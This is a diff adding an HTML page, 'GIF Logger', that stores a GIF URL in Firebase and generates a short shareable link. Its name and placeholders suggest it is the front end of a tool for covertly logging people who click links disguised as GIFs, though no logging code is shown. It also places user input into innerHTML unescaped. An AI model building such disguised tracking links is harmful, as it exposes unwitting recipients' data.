@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIF Logger</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+        .card { 
+            background: #1e1e1e; 
+            padding: 2.5rem; 
+            border-radius: 16px; 
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6); 
+            width: 100%;
+            max-width: 500px;
+        }
+        h2 { 
+            color: #fff; 
+            margin-bottom: 1.5rem; 
+            text-align: center;
+            font-size: 1.8rem;
+        }
+        label {
+            display: block;
+            color: #b0b0b0;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            margin-bottom: 20px; 
+            border-radius: 8px; 
+            border: 1px solid #333; 
+            background: #252525; 
+            color: white; 
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            border: none; 
+            border-radius: 8px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; 
+            font-weight: bold; 
+            font-size: 1rem;
+            cursor: pointer; 
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        #output { 
+            margin-top: 20px; 
+            padding: 15px;
+            background: #252525;
+            border-radius: 8px;
+            word-break: break-all; 
+            color: #00ff88; 
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            display: none;
+        }
+        #output.show {
+            display: block;
+        }
+        .copy-btn {
+            margin-top: 10px;
+            background: #00ff88;
+            color: #1e1e1e;
+            padding: 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #00cc6a;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>GIF Logger</h2>
+        
+        <label for="longUrl">Direct GIF URL</label>
+        <input type="text" id="longUrl" placeholder="https://media.tenor.com/...">
+        
+        <label for="customId">Custom ID (optional)</label>
+        <input type="text" id="customId" placeholder="middleclickme (leave empty for random)">
+        
+        <button onclick="generateLink()">Generate Logger Link</button>
+        
+        <div id="output">
+            <div id="linkDisplay"></div>
+            <div class="copy-btn" onclick="copyLink()">Copy Link</div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        
+        const firebaseConfig = {
+            apiKey: "",
+            authDomain: "",
+            databaseURL: "",
+            projectId: "",
+            storageBucket: "",
+            messagingSenderId: "",
+            appId: ""
+        };
+        
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        
+        let generatedLink = '';
+        
+        window.generateLink = async function() {
+            const longUrl = document.getElementById('longUrl').value.trim();
+            const customId = document.getElementById('customId').value.trim();
+            
+            if (!longUrl) {
+                alert("Please enter a GIF URL!");
+                return;
+            }
+            
+            if (!longUrl.startsWith('http')) {
+                alert("URL must start with http:// or https://");
+                return;
+            }
+            
+            let shortId;
+            if (customId) {
+                const snapshot = await get(ref(db, 'shortenedurls/' + customId));
+                if (snapshot.exists()) {
+                    alert("This custom ID is already taken!");
+                    return;
+                }
+                shortId = customId;
+            } else {
+                shortId = Math.random().toString(36).substring(2, 10);
+            }
+            
+            try {
+                await set(ref(db, 'shortenedurls/' + shortId), longUrl);
+                
+                generatedLink = `https://yourdomain.vercel.app/${shortId}`;
+                
+                document.getElementById('linkDisplay').innerHTML = `
+                    <strong>Success</strong><br><br>
+                    <strong>Share this link:</strong><br>
+                    <a href="${generatedLink}" target="_blank" style="color: #00ff88;">${generatedLink}</a>
+                `;
+                document.getElementById('output').classList.add('show');
+                
+            } catch (e) {
+                alert("Error: " + e.message);
+            }
+        }
+        
+        window.copyLink = function() {
+            navigator.clipboard.writeText(generatedLink).then(() => {
+                alert("Link copied to clipboard!");
+            }).catch(() => {
+                alert("Failed to copy. Please copy manually.");
+            });
+        }
+    </script>
+</body>
+</html>
